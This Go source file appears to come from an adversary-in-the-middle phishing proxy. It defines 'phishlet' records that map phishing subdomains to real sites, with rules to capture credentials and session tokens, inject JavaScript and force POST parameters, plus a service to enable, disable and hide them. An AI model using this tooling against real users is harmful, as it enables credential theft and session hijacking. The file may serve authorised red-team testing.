package aitm

import (
	"fmt"
	"regexp"
	"strings"
)

// phishletStore is the persistence interface required by PhishletService.
// It persists only operator config fields; compiled rule fields are never stored.
type phishletStore interface {
	GetPhishlet(name string) (*Phishlet, error)
	SetPhishlet(p *Phishlet) error
	ListPhishlets() ([]*Phishlet, error)
	DeletePhishlet(name string) error
}

// Phishlet is the unified type representing a phishlet — combining the compiled
// rules from its YAML file with the operator's runtime configuration.
//
// The compiled rule fields (ProxyHosts, SubFilters, etc.) are populated by the
// phishlet loader and are never persisted. The operator config fields (Hostname,
// BaseDomain, etc.) are persisted to the database and survive restarts.
//
// Either group of fields may be zero-valued: a freshly loaded YAML has no
// operator config; a record loaded from the database has no compiled rules.
// The daemon merges both at startup and on reload.
type Phishlet struct {
	// Identity (from YAML)
	Name    string
	Author  string
	Version string

	// Compiled rules (from YAML — in-memory only, never persisted)
	ProxyHosts  []ProxyHost
	SubFilters  []SubFilter
	AuthTokens  []TokenRule
	Credentials CredentialRules
	Login       LoginSpec
	ForcePosts  []ForcePost
	Intercepts  []InterceptRule
	JSInjects   []JSInject
	AuthURLs    []*regexp.Regexp

	// Operator config (persisted to SQLite)
	BaseDomain  string
	DNSProvider string
	Hostname    string
	UnauthURL   string
	SpoofURL    string
	Enabled     bool
	Hidden      bool
}

// applyOperatorConfig copies all operator-config fields from src into p.
// This is the single place that lists which fields are persisted, so adding a
// new operator field only requires updating this method.
func (p *Phishlet) applyOperatorConfig(src *Phishlet) {
	p.BaseDomain = src.BaseDomain
	p.DNSProvider = src.DNSProvider
	p.Hostname = src.Hostname
	p.UnauthURL = src.UnauthURL
	p.SpoofURL = src.SpoofURL
	p.Enabled = src.Enabled
	p.Hidden = src.Hidden
}

// MatchesHost reports whether hostname belongs to this phishlet under baseDomain.
func (p *Phishlet) MatchesHost(hostname, baseDomain string) bool {
	for _, host := range p.ProxyHosts {
		if hostname == host.PhishSubdomain+"."+baseDomain {
			return true
		}
	}
	return false
}

// FindLanding returns the proxy host marked is_landing, or nil if none.
func (p *Phishlet) FindLanding() *ProxyHost {
	for i := range p.ProxyHosts {
		if p.ProxyHosts[i].IsLanding {
			return &p.ProxyHosts[i]
		}
	}
	return nil
}

// MatchesAuthURL reports whether rawURL matches any of the phishlet's auth URL patterns.
func (p *Phishlet) MatchesAuthURL(rawURL string) bool {
	for _, authURL := range p.AuthURLs {
		if authURL.MatchString(rawURL) {
			return true
		}
	}
	return false
}

// ProxyHost maps a phishing subdomain to a real upstream host.
type ProxyHost struct {
	PhishSubdomain string
	OrigSubdomain  string
	Domain         string
	IsLanding      bool
	IsSession      bool
	AutoFilter     bool
}

// SubFilter is a compiled search/replace rule applied to proxied response bodies.
type SubFilter struct {
	Hostname  string
	MimeTypes []string
	Search    *regexp.Regexp
	Replace   string
}

func (s *SubFilter) MatchesMIME(mimeType string) bool {
	for _, mime := range s.MimeTypes {
		if strings.HasPrefix(mimeType, mime) {
			return true
		}
	}
	return false
}

// TokenType classifies how an auth token is extracted.
type TokenType int

const (
	TokenTypeCookie TokenType = iota
	TokenTypeBody
	TokenTypeHTTPHeader
)

// TokenRule describes how to capture one auth token from a response.
type TokenRule struct {
	Type     TokenType
	Domain   string
	Path     *regexp.Regexp
	Name     *regexp.Regexp
	Search   *regexp.Regexp
	HTTPOnly bool
	Always   bool
}

// CredentialRules groups the extraction rules for username, password, and custom fields.
type CredentialRules struct {
	Username CredentialRule
	Password CredentialRule
	Custom   []CustomCredentialRule
}

// CredentialRule is a key+search regex pair that extracts one field from POST/JSON.
type CredentialRule struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
	Type   string // "post" or "json"
}

// CustomCredentialRule is like CredentialRule but stores into Session.Custom[Name].
type CustomCredentialRule struct {
	Name string
	CredentialRule
}

// LoginSpec identifies where the login form lives.
type LoginSpec struct {
	Domain string
	Path   string
}

// ForcePost describes a POST parameter to inject or override.
type ForcePost struct {
	Path       *regexp.Regexp
	Conditions []ForcePostCondition
	Params     []ForcePostParam
}

type ForcePostCondition struct {
	Key    *regexp.Regexp
	Search *regexp.Regexp
}

type ForcePostParam struct {
	Key   string
	Value string
}

// InterceptRule matches a request and returns a fully custom response.
type InterceptRule struct {
	Path        *regexp.Regexp
	BodySearch  *regexp.Regexp
	StatusCode  int
	ContentType string
	Body        string
}

// JSInject defines a JavaScript snippet to inject into matching pages.
type JSInject struct {
	TriggerDomain string
	TriggerPath   *regexp.Regexp
	Script        string
}

// PhishletService owns all business logic for phishlet lifecycle.
// It is the single point of truth for which phishlets are active: every
// enable/disable writes to the store AND updates the in-memory resolver,
// so the proxy router never falls out of sync with the database.
type PhishletService struct {
	store    phishletStore
	bus      eventBus
	dns      *DNSService
	resolver *PhishletResolver
}

func NewPhishletService(store phishletStore, bus eventBus, dns *DNSService, resolver *PhishletResolver) *PhishletService {
	return &PhishletService{store: store, bus: bus, dns: dns, resolver: resolver}
}

// LoadActiveFromDB merges stored operator configs from the database into any
// phishlets already registered in the resolver. Call once during startup,
// after YAML files have been loaded, before the proxy begins accepting connections.
func (s *PhishletService) LoadActiveFromDB() error {
	stored, err := s.store.ListPhishlets()
	if err != nil {
		return fmt.Errorf("loading phishlets: %w", err)
	}
	for _, storedPhishlet := range stored {
		p := s.resolver.Get(storedPhishlet.Name)
		if p == nil {
			// YAML not loaded yet — register config-only so the operator can still
			// query and modify it via the API.
			s.resolver.Register(storedPhishlet)
			continue
		}
		merged := *p
		merged.applyOperatorConfig(storedPhishlet)
		s.resolver.Register(&merged)
	}
	return nil
}

// Contains reports whether hostname is currently proxied by an active phishlet.
// Satisfies proxy.HostnameSet so PhishletService can be passed directly to PhishletRouter.
func (s *PhishletService) Contains(hostname string) bool {
	return s.resolver.ContainsHostname(hostname)
}

// Enable marks a phishlet as active, optionally updating its hostname, base
// domain, and DNS provider. The resolver is updated atomically so routing
// takes effect immediately without a restart.
func (s *PhishletService) Enable(name, hostname, baseDomain, dnsProvider string) (*Phishlet, error) {
	p := s.currentOrNew(name)
	if hostname != "" {
		p.Hostname = hostname
	}
	if baseDomain != "" {
		p.BaseDomain = baseDomain
	}
	if dnsProvider != "" {
		p.DNSProvider = dnsProvider
	}
	if p.Hostname == "" {
		return nil, ErrHostnameRequired
	}
	if owner := s.resolver.OwnerOf(p.Hostname); owner != "" && owner != p.Name {
		return nil, ErrHostnameConflict
	}
	p.Enabled = true
	if err := s.store.SetPhishlet(p); err != nil {
		return nil, err
	}
	s.resolver.Register(p)
	return p, nil
}

// Disable marks a phishlet as inactive.
func (s *PhishletService) Disable(name string) (*Phishlet, error) {
	p, err := s.currentOrErr(name)
	if err != nil {
		return nil, err
	}
	p.Enabled = false
	if err := s.store.SetPhishlet(p); err != nil {
		return nil, err
	}
	s.resolver.Register(p)
	return p, nil
}

// Hide marks a phishlet as hidden (suppressed from lure URL generation).
// Does not affect routing — the phishlet keeps intercepting traffic.
func (s *PhishletService) Hide(name string) (*Phishlet, error) {
	p, err := s.currentOrErr(name)
	if err != nil {
		return nil, err
	}
	p.Hidden = true
	if err := s.store.SetPhishlet(p); err != nil {
		return nil, err
	}
	s.resolver.Register(p)
	return p, nil
}

// Unhide reverses Hide.
func (s *PhishletService) Unhide(name string) (*Phishlet, error) {
	p, err := s.currentOrErr(name)
	if err != nil {
		return nil, err
	}
	p.Hidden = false
	if err := s.store.SetPhishlet(p); err != nil {
		return nil, err
	}
	s.resolver.Register(p)
	return p, nil
}

// Get returns the phishlet by name, preferring the resolver's in-memory
// copy (which has compiled rules) over the store.
func (s *PhishletService) Get(name string) (*Phishlet, error) {
	if p := s.resolver.Get(name); p != nil {
		return p, nil
	}
	return s.store.GetPhishlet(name)
}

// List returns all stored phishlet operator configs.
func (s *PhishletService) List() ([]*Phishlet, error) {
	return s.store.ListPhishlets()
}

// currentOrNew returns a copy of the registered phishlet (if any), otherwise
// a shell loaded from the store or newly created.
func (s *PhishletService) currentOrNew(name string) *Phishlet {
	if p := s.resolver.Get(name); p != nil {
		copy := *p
		return &copy
	}
	stored, err := s.store.GetPhishlet(name)
	if err != nil {
		return &Phishlet{Name: name}
	}
	return stored
}

// currentOrErr returns a copy of the current phishlet state or an error if not found anywhere.
func (s *PhishletService) currentOrErr(name string) (*Phishlet, error) {
	if p := s.resolver.Get(name); p != nil {
		copy := *p
		return &copy, nil
	}
	return s.store.GetPhishlet(name)
}
